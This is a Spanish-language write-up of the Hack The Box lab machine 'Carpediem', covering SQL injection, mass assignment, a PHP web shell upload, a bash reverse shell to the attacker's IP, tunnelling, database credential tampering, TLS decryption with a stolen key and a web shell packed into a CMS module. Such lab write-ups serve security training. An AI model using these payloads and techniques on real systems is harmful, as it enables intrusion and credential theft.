---
layout: post
title: Carpediem
date: 2023-02-12
description:
img:
fig-caption:
tags: [OSCP, eCPPTv2, eCPTXv2, eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Carpediem-htb/Carpediem.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Mass Assigment Attack

* Creación de formulario para emitir data por POST en HTML

* Information Disclosure

* Enumeración de API

* Abuso de Capabilities

* Abuso de cifrado SSL (TLS_RSA_WITH_AES_256_CBC_SHA256)

* Análisis de tráfico de red con Wireshark

* Abuso de tarea CRON

* Docker Breakout [CVE-2022-0492] (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.167 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 10:03 GMT
Nmap scan report for 10.10.11.167
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.11 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.167 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 10:04 GMT
Nmap scan report for 10.10.11.167
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 962176f72dc5f04ee0a8dfb4d95e4526 (RSA)
|   256 b16de3fada10b97b9e57535c5bb76006 (ECDSA)
|_  256 6a1696d80529d590bf6b2a0932dc364f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Comming Soon
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.167
http://10.10.11.167 [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.167], Meta-Author[Pawel Zuchowski], Script[text/javascript], Title[Comming Soon], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Carpediem-htb/1.png" alt="">

Añado el dominio ```carpediem.htb``` al ```/etc/hosts```

Busco por subdominios con ```wfuzz```

```null
wfuzz -c -t 200 --hh=2875 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.carpediem.htb" http://carpediem.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://carpediem.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000048:   200        462 L    2174 W     31090 Ch    "portal"                                                                                                                                        

Total time: 7.261601
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 687.0385
```

Lo añado también al ```/etc/hosts```

Tiene otro contenido

<img src="/writeups/assets/img/Carpediem-htb/2.png" alt="">

El parámetro ```?id``` es vulnerable a inyección SQL. En total hay 12 columnas. Esta vez utilizo ```SQLmap``` para agilizar

<img src="/writeups/assets/img/Carpediem-htb/3.png" alt="">

Obtengo un hash para el usuario ```admin```

```null
sqlmap --url 'http://portal.carpediem.htb/?p=view_bike&id=98f13708210194c475687be6106a3b84*' -D portal -T users -C username,password --dump --batch -v 0
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:22:53 /2023-02-12/

Database: portal                                                                                                                                                                                                
Table: users
[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | b723e511b084ab84b44235d82da572f3 |
+----------+----------------------------------+


[*] ending @ 10:23:07 /2023-02-12/
```

Pero no se puede crackear

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-02-12 10:25) 0g/s 21093Kp/s 21093Kc/s 21093KC/s  filimani..*7¡Vamos!
Session completed. 
```

En el parámetro ```?p```, puede llegar a leakear la ruta donde se aloja el servicio web al intentar cargar un archivo local de la máquina junto a un null byte para separar la extensión PHP

<img src="/writeups/assets/img/Carpediem-htb/7.png" alt="">

Me registro en la web, pero no sin antes interceptar la petición con ```BurpSuite```

<img src="/writeups/assets/img/Carpediem-htb/4.png" alt="">

Se está apuntando a ```register``` a través del parámetro ```?f```

<img src="/writeups/assets/img/Carpediem-htb/5.png" alt="">

Produzco en un error, y consigo ver la query que se aplica en ```MySQL``` para registrar al usuario

<img src="/writeups/assets/img/Carpediem-htb/6.png" alt="">

Aplico fuzzing en la ruta ```/classes``` en busca de archivos PHP

```null
gobuster dir -u http://portal.carpediem.htb/classes -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://portal.carpediem.htb/classes
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/12 10:33:37 Starting gobuster in directory enumeration mode
===============================================================
/Login.php            (Status: 200) [Size: 74]
/Users.php            (Status: 200) [Size: 0]
/Master.php           (Status: 200) [Size: 0]
/Zone.php             (Status: 200) [Size: 0]
Progress: 441037 / 441094 (99.99%)
===============================================================
2023/02/12 10:40:46 Finished
===============================================================
```

Puedo probar a fuzzear por funciones con el mismo parámetro que utilizaba el ```Master.php``` para ```Users.php```

```null
wfuzz -c -t 100 --hh=0 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://portal.carpediem.htb/classes/Users.php?f=FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://portal.carpediem.htb/classes/Users.php?f=FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000352:   200        0 L      2 W        40 Ch       "upload"    
```

Espera un formulario de subida de archivos

<img src="/writeups/assets/img/Carpediem-htb/12.png" alt="">

Creo un archivo ```index.html``` básico que se encargue de crear la estructura en un servicio local, para interceptarla con ```BurpSuite``` y emitirla al servidor.

```null
<form action="test.php" method="post" enctype="multipart/form-data" target="_blank">
  <p>
    <input type="file" name="upload">
    <input type="submit" value="upload">
  </p>
</form>
```

Voy a intentar pasarle una webshell en PHP

```null
<?php
  shell_exec($_REQUEST['cmd']);
?>
```

Ahora el error cambia

<img src="/writeups/assets/img/Carpediem-htb/13.png" alt="">

Le cambio el nombre a ```file_upload```

<img src="/writeups/assets/img/Carpediem-htb/14.png" alt="">

Supuestamente se ha subido a una ruta. Puedo ejecutar comandos, pero no veo el output

<img src="/writeups/assets/img/Carpediem-htb/15.png" alt="">

Tengo conectividad con mi equipo, me mandé un ping y lo recibí

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:42:14.083760 IP 10.10.11.167 > 10.10.16.7: ICMP echo request, id 678, seq 0, length 64
11:42:14.083857 IP 10.10.16.7 > 10.10.11.167: ICMP echo reply, id 678, seq 0, length 64
```

Puedo enviarme una reverse shell

```null
curl -s -X GET "portal.carpediem.htb/uploads/1676202000_cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.7/443+0>%261'"
```

Y la recibo en una sesión en netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.167] 34360
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3c371615b7aa:/var/www/html/portal/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@3c371615b7aa:/var/www/html/portal/uploads$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@3c371615b7aa:/var/www/html/portal/uploads$ export TERM=xterm
www-data@3c371615b7aa:/var/www/html/portal/uploads$ export SHELL=bash
www-data@3c371615b7aa:/var/www/html/portal/uploads$ stty rows 55 columns 209
```

Estoy dentro de un contenedor

```nul
www-data@3c371615b7aa:/var/www/html/portal/uploads$ hostname -I
172.17.0.6 
```

# Intrusión Alternativa

Hay una sección donde puedo modificar los datos de mi cuenta (proporcionados previamente en el registro)

<img src="/writeups/assets/img/Carpediem-htb/8.png" alt="">

Intercepto la petición, y veo parámetros en la data por POST que antes no aparecían

<img src="/writeups/assets/img/Carpediem-htb/9.png" alt="">

Suponiendo que el ```login_type=1``` es del Administrador, fuerzo a cambiar el mío a ese valor

Aplico fuzzing de directorios desde la raíz y encuentro una sección de administrador, a la que ahora tengo acceso, porque modifiqué mi tipo de usuario

```null
gobuster dir -u http://portal.carpediem.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 150
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://portal.carpediem.htb/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/12 11:06:39 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 330] [--> http://portal.carpediem.htb/uploads/]
/admin                (Status: 301) [Size: 328] [--> http://portal.carpediem.htb/admin/]
/assets               (Status: 301) [Size: 329] [--> http://portal.carpediem.htb/assets/]
/plugins              (Status: 301) [Size: 330] [--> http://portal.carpediem.htb/plugins/]
/classes              (Status: 301) [Size: 330] [--> http://portal.carpediem.htb/classes/]
/dist                 (Status: 301) [Size: 327] [--> http://portal.carpediem.htb/dist/]
/inc                  (Status: 301) [Size: 326] [--> http://portal.carpediem.htb/inc/]
/build                (Status: 301) [Size: 328] [--> http://portal.carpediem.htb/build/]
/libs                 (Status: 301) [Size: 327] [--> http://portal.carpediem.htb/libs/]
```

<img src="/writeups/assets/img/Carpediem-htb/10.png" alt="">

Puedo editar datos en una sección de esta página

<img src="/writeups/assets/img/Carpediem-htb/16.png" alt="">

Al interceptar la petición con ```BurpSuite```, llego a la misma petición que antes

<img src="/writeups/assets/img/Carpediem-htb/17.png" alt="">

<img src="/writeups/assets/img/Carpediem-htb/18.png" alt="">

Dentro del contenedor, encuentro credenciales de acceso a la base de datos

```null
www-data@3c371615b7aa:/var/www/html/portal$ cat classes/DBConnection.php
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = 'mysql';
    private $username = 'portaldb';
    private $password = 'J5tnqsXpyzkK4XNt';
    private $database = 'portal';

...
```

En el ```/etc/hosts``` se referencian varias IPs

```null
www-data@3c371615b7aa:/var/www$ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.3	mysql a5004fe641ca
172.17.0.6	3c371615b7aa
```

Pero por si hay más, subo un binario estático de ```nmap``` para aplicar host y port discovering

```null
www-data@3c371615b7aa:/tmp$ ./nmap -p- --min-rate 10000 172.17.0.1-6

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-02-12 12:25 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00061s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.17.0.2
Host is up (0.00056s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https

Nmap scan report for mysql (172.17.0.3)
Host is up (0.00067s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for 172.17.0.4
Host is up (0.00016s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap scan report for 172.17.0.5
Host is up (0.00043s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8118/tcp open  unknown

Nmap scan report for 3c371615b7aa (172.17.0.6)
Host is up (0.000076s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 6 IP addresses (6 hosts up) scanned in 22.34 seconds
```

Subo el ```chisel``` para montarme un tunel por SOCKS5 y tener acceso a todos los segmentos

En mi equipo creo el servidor

```null
chisel server -p 1234 --reverse
2023/02/12 12:31:55 server: Reverse tunnelling enabled
2023/02/12 12:31:55 server: Fingerprint Zdt8Jmk9PKjlUxg++CD3GFZPqvyPSOCZtxBtA72wTwY=
2023/02/12 12:31:55 server: Listening on http://0.0.0.0:1234
```

En el contenedor me conecto

```null
www-data@3c371615b7aa:/tmp$ wget http://10.10.16.7/chisel
--2023-02-12 12:33:14--  http://10.10.16.7/chisel
Connecting to 10.10.16.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3107968 (3.0M) [application/octet-stream]
Saving to: 'chisel'

chisel                                               100%[===================================================================================================================>]   2.96M   696KB/s    in 4.4s    

2023-02-12 12:33:19 (696 KB/s) - 'chisel' saved [3107968/3107968]

www-data@3c371615b7aa:/tmp$ chmod +x chisel
www-data@3c371615b7aa:/tmp$ ./chisel client 10.10.16.7:1234 R:socks &>/dev/null & disown
[1] 3159
```

El ```MySQL``` ya lo había enumerado a través de la inyección, pero no encontré nada. Sin embargo, hay otra base de datos, pero en ```MongoDB```

```null
 proxychains mongo 172.17.0.4
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
MongoDB shell version v6.0.1
connecting to: mongodb://172.17.0.4:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("3259a2f3-dd2f-4756-a2dd-c90f843cf6f1") }
MongoDB server version: 5.0.6
WARNING: shell and server versions do not match
> 
```

Puedo listar las bases de datos

```null
> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
trudesk  0.001GB
```

La única que tiene algo de contendido es ```trudesk```

```null
> use trudesk
switched to db trudesk
> show collections
accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes
```

En ```MongoDB``` existe una forma de buscar por las cuentas existentes

```null
> db.accounts.find()
{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS", "fullname" : "Robert Frost", "email" : "rfrost@carpediem.htb", "role" : ObjectId("623c8b20855cc5001a8ba138"), "title" : "Sr. Network Engineer", "accessToken" : "22e56ec0b94db029b07365d520213ef6f5d3d2d9", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:30:32.198Z") }
{ "_id" : ObjectId("6243c0be1e0d4d001b0740d4"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jhammond", "email" : "jhammond@carpediem.htb", "password" : "$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq", "fullname" : "Jeremy Hammond", "title" : "Sr. Systems Engineer", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "a0833d9a06187dfd00d553bd235dfe83e957fd98", "__v" : 0, "lastOnline" : ISODate("2022-04-01T23:36:55.940Z") }
{ "_id" : ObjectId("6243c28f1e0d4d001b0740d6"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jpardella", "email" : "jpardella@carpediem.htb", "password" : "$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK", "fullname" : "Joey Pardella", "title" : "Desktop Support", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "7c0335559073138d82b64ed7b6c3efae427ece85", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:33:20.918Z") }
{ "_id" : ObjectId("6243c3471e0d4d001b0740d7"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "acooke", "email" : "acooke@carpediem.htb", "password" : "$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.", "fullname" : "Adeanna Cooke", "title" : "Director - Human Resources", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "9c7ace307a78322f1c09d62aae3815528c3b7547", "__v" : 0, "lastOnline" : ISODate("2022-03-30T14:21:15.212Z") }
{ "_id" : ObjectId("6243c69d1acd1559cdb4019b"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "svc-portal-tickets", "email" : "tickets@carpediem.htb", "password" : "$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW", "fullname" : "Portal Tickets", "title" : "", "role" : ObjectId("623c8b20855cc5001a8ba13a"), "accessToken" : "f8691bd2d8d613ec89337b5cd5a98554f8fffcc4", "__v" : 0, "lastOnline" : ISODate("2022-03-30T13:50:02.824Z") }
```


Tengo varios correos con sus respectivos tokens y contraseñas, que no se pueden crackear.

```null
cat data | grep -oP '".*?"' | tr -d '"' | grep "^\$2b" > hashes
```
```null
$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS
$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq
$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK
$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.
$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW
```

En el directorio ```/var/www/html/portal/classes``` hay un archivo ```Trudesk.php```

```null
<?php
class TrudeskConnection{

    private $host = 'trudesk.carpediem.htb';
    private $apikey = 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4';
    private $username = 'svc-portal-tickets';
    private $password = '';
    private $database = '';
    
}
?>
```

Añado el subdominio al ```/etc/hosts```. Tengo acceso a un nuevo panel de inicio de sesión

<img src="/writeups/assets/img/Carpediem-htb/19.png" alt="">

Tiene una API

```null
curl -s -X GET 'http://trudesk.carpediem.htb/api' | jq
{
  "supported": [
    "v1",
    "v2"
  ]
}
```

Como es una aplicación de código abierto, puedo ver las rutas en el [código fuente](https://github.com/polonel/trudesk/blob/5bbc42395de7d2589daa97d6837500826448ac11/src/controllers/api.js).

Si intento acceder a cualquiera, me pide un API-Token

```null
curl -s -X GET 'http://trudesk.carpediem.htb/api/v1/users' | jq
{
  "error": "Invalid Access Token"
}
```

Agrego una cabecera con el Access-Token

```null
curl -s -X GET 'http://trudesk.carpediem.htb/api/v1/users' -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" | jq
{
  "success": false,
  "error": "Not Authorized for this API call."
}
```

Genero un hash en brypt para cambiárselo al usuario ```admin```

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import bcrypt
>>> bcrypt.hashpw( b'rubbx', bcrypt.gensalt(rounds=4))
b'$2b$04$HCrXKUzABhUuoOILqEdoH.ToVz7ET3v7B84P1PN9zbO2wCCLa4tgC'
```

En el ```MongoDB``` introduzco la query que lo aplica

```null
> db.accounts.update( {"username" : "admin" }, {$set: {"password": "$2b$04$HCrXKUzABhUuoOILqEdoH.ToVz7ET3v7B84P1PN9zbO2wCCLa4tgC"} });
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

<img src="/writeups/assets/img/Carpediem-htb/20.png" alt="">

Dentro de la interfaz se puede ver los tickets creados

<img src="/writeups/assets/img/Carpediem-htb/21.png" alt="">

Hay una pista CTF en la que hablan sobre una nueva aplicación que está desplegada

<img src="/writeups/assets/img/Carpediem-htb/22.png" alt="">

Instalo [Zoiper](https://www.zoiper.com/en/voip-softphone/download/current) en mi equipo para poder escuchar el mensaje. Como contraseña le paso '2022'

<img src="/writeups/assets/img/Carpediem-htb/23.png" alt="">

Me puedo conectar por varios protocolos

<img src="/writeups/assets/img/Carpediem-htb/24.png" alt="">

Marco el *62 en la aplicación

<img src="/writeups/assets/img/Carpediem-htb/25.png" alt="">

Tecleo el '1', me pide una contraseña y vuelvo a escribir '2022'. Apunto la contraseña:

```null
AuRj4pxq9qPk
```
Son las credenciales de acceso por SSH para el usuario Horace Flaccus, ```hflaccus```

```null
ssh hflaccus@carpediem.htb
The authenticity of host 'carpediem.htb (10.10.11.167)' can't be established.
ED25519 key fingerprint is SHA256:a73n2+aC9x00tkOE969gEXaHQMZQcHtD3eY2kM1GgW8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'carpediem.htb' (ED25519) to the list of known hosts.
hflaccus@carpediem.htb's password: 

hflaccus@carpediem:~$ 
```

Puedo visualizar la primera flag

```null
hflaccus@carpediem:~$ cat user.txt 
34b14ce7d0a0f49704067ced950e9e64
```

# Escalada

Busco por capabilities asignadas

```null
hflaccus@carpediem:/$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Con ```tcpdump``` puedo interceptar los paquetes

Tengo varias interfaces asignadas

```null
hflaccus@carpediem:/$ ip a | grep "<"
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
5: veth7c9db99@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
7: veth7f12aff@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
9: veth6dc398a@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
11: veth99d0565@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
13: vethee76757@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
```

En cuanto a los puertos abiertos, hay 3 internos que son HTTP

```null
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process                   
LISTEN                   0                        511                                              0.0.0.0:80                                            0.0.0.0:*                                               
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*                                               
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*                                               
LISTEN                   0                        4096                                           127.0.0.1:8000                                          0.0.0.0:*                                               
LISTEN                   0                        4096                                           127.0.0.1:8001                                          0.0.0.0:*                                               
LISTEN                   0                        4096                                           127.0.0.1:8002                                          0.0.0.0:*                                               
LISTEN                   0                        10                                             127.0.0.1:5038                                          0.0.0.0:*                                               
LISTEN                   0                        128                                                 [::]:22                                               [::]:*         
```

Al tramitar una petición por GET por el puerto 8002, puedo ver un subdominio nuevo, ```backdrop.carpediem.htb```, que añado en mi ```/etc/hosts```

```null
hflaccus@carpediem:/$ curl http://localhost:8002
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
 Instead use the HTTPS scheme to access this URL, please.<br />
</p>
<hr>
<address>Apache/2.4.48 (Ubuntu) Server at backdrop.carpediem.htb Port 80</address>
</body></html>
```

Hago un Local Port Forwarding para traerme el puerto 8002 a mi equipo

```null
ssh> -L 8002:127.0.0.1:8002
Forwarding port.
```

<img src="/writeups/assets/img/Carpediem-htb/26.png" alt="">

Dentro hay un panel de inicio de sesión

<img src="/writeups/assets/img/Carpediem-htb/27.png" alt="">

No tengo credenciales. Pruebo a efectuar un LFI pero no consigo nada

<img src="/writeups/assets/img/Carpediem-htb/28.png" alt="">

Puedo capturar tráfico de la red gracias a la capability que vi antes. Pero como es HTTPS los datos no viajan en texto claro. En caso de encuentre la clave privada de la web, lo puedo desencriptar

```null
hflaccus@carpediem:/tmp$ tcpdump -i docker0 -w Captura.cap -v
tcpdump: listening on docker0, link-type EN10MB (Ethernet), capture size 262144 bytes
^C517 packets captured
517 packets received by filter
0 packets dropped by kernel
```

Lo transfiero a mi equipo para verlo con ```WireShark```. Aunque todavía no tenga el certificado, si que aparece en el flujo TCP que son peticiones contra el CMS del puerto 8002

<img src="/writeups/assets/img/Carpediem-htb/29.png" alt="">

Se está empleando RSA

<img src="/writeups/assets/img/Carpediem-htb/30.png" alt="">

Busco en Google sobre este tipo de encriptación concreta

<img src="/writeups/assets/img/Carpediem-htb/31.png" alt="">

Al no soportar PFS, solo con la clave privada valdría, ya que no se genera una nueva clave por cada sesión. En este [artículo](https://ciberseguridad.com/guias/prevencion-proteccion/perfect-forward-secrecy-pfs/) está todo detallado

Busco la clave privada desde la raíz

```null
hflaccus@carpediem:/$ find \-name \*key 2>/dev/null | grep backdrop
./etc/ssl/certs/backdrop.carpediem.htb.key
```

La transfiero a mi equipo para importarla al ```WireShark```, junto a otras dependencias de certificados que se encuentran en ese mismo directorio

```null
hflaccus@carpediem:/etc/ssl/certs$ ls | grep backdrop
backdrop.carpediem.htb.crt
backdrop.carpediem.htb.key
```

<img src="/writeups/assets/img/Carpediem-htb/32.png" alt="">

Y obtengo las credenciales en texto claro

<img src="/writeups/assets/img/Carpediem-htb/33.png" alt="">

Accedo al CMS como Administrador

<img src="/writeups/assets/img/Carpediem-htb/34.png" alt="">

Dentro hay una sección para instalar módulos

<img src="/writeups/assets/img/Carpediem-htb/35.png" alt="">

Desde la página oficial de BackDropCMS, descargo un módulo y lo modifico para poder ganar acceso al sistema

<img src="/writeups/assets/img/Carpediem-htb/36.png" alt="">

Agrego un nuevo archivo PHP

```null
<?php
  shell_exec($_REQUEST['cmd']);
?>
```

Comprimo todo de nuevo

```null
zip -r ckeditor_blocks.zip ckeditor_blocks
  adding: ckeditor_blocks/ (stored 0%)
  adding: ckeditor_blocks/css/ (stored 0%)
  adding: ckeditor_blocks/css/ckeditor_blocks.css (deflated 63%)
  adding: ckeditor_blocks/cmd.php (stored 0%)
  adding: ckeditor_blocks/plugins/ (stored 0%)
  adding: ckeditor_blocks/plugins/blocks/ (stored 0%)
  adding: ckeditor_blocks/plugins/blocks/plugin.js (deflated 62%)
  adding: ckeditor_blocks/plugins/blocks/icons/ (stored 0%)
  adding: ckeditor_blocks/plugins/blocks/icons/blocks.png (deflated 6%)
  adding: ckeditor_blocks/plugins/blocks/lang/ (stored 0%)
  adding: ckeditor_blocks/plugins/blocks/lang/en.js (deflated 15%)
  adding: ckeditor_blocks/plugins/blocks/dialogs/ (stored 0%)
  adding: ckeditor_blocks/plugins/blocks/dialogs/blocks.js (deflated 57%)
  adding: ckeditor_blocks/ckeditor_blocks.module (deflated 70%)
  adding: ckeditor_blocks/ckeditor_blocks.info (deflated 31%)
